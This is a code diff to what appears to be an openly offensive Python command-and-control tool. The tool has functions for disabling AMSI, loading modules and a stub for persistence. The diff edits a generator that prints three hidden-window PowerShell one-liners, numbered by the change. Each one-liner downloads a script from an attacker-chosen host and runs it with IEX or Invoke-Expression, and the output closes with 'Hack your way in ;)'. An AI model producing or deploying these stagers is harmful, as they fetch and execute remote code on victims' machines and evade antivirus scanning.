@@ -102,9 +102,6 @@ def list_modules():
 def persistence():
     # to do
     pass
-def upload_file():
-    pass
-    # read file as base64 and save it to variable
 
 def load_module(session, module_name):
 	module = "modules/" + module_name
@@ -133,9 +130,9 @@ def disable_amsi(session):
 def generate(hostname, path, proto, interval):
     c = random.choice(string.ascii_lowercase)
     print((colored("#====================", "red")))
-    print(("powershell -w hidden " + '"IEX (New-Object Net.WebClient).DownloadString(\'{2}://{0}/{1}\');"'.format(hostname, path, proto)))
-    print(("powershell -w hidden " + '"Invoke-Expression (New-Object Net.WebClient).DownloadString(\'{2}://{0}/{1}\');"'.format(hostname, path, proto)))
-    print(("powershell -w hidden " + '"${3} = (New-Object Net.WebClient).DownloadString(\'{2}://{0}/{1}\');Invoke-Expression ${3};"'.format(hostname, path, proto, c)))
+    print(("1) powershell -w hidden " + '"IEX (New-Object Net.WebClient).DownloadString(\'{2}://{0}/{1}\');"\n'.format(hostname, path, proto)))
+    print(("2) powershell -w hidden " + '"Invoke-Expression (New-Object Net.WebClient).DownloadString(\'{2}://{0}/{1}\');"\n'.format(hostname, path, proto)))
+    print(("3) powershell -w hidden " + '"${3} = (New-Object Net.WebClient).DownloadString(\'{2}://{0}/{1}\');Invoke-Expression ${3};"\n'.format(hostname, path, proto, c)))
     print("Hack your way in ;)")
     print((colored("#====================", "red")))
 
